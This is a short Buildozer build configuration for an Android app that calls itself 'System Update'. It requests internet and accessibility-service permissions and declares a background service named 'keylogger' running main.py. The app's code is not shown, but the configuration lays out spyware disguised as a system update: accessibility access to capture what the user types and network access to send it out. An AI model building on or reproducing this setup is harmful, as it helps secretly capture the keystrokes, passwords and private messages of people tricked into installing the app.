[app]
title = System Update
package.name = sysupdate
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,xml
version = 0.1
requirements = python3, kivy, pyjnius, openssl, requests

# Permissions
android.permissions = INTERNET, BIND_ACCESSIBILITY_SERVICE

# Android specific
android.api = 31
android.minapi = 21
android.sdk = 31
android.archs = arm64-v8a, armeabi-v7a

# Background Service declaration
android.services = keylogger:main.py

# To include the xml folder
source.include_patterns = res/*, res/xml/*

[buildozer]
log_level = 2
warn_on_root = 1
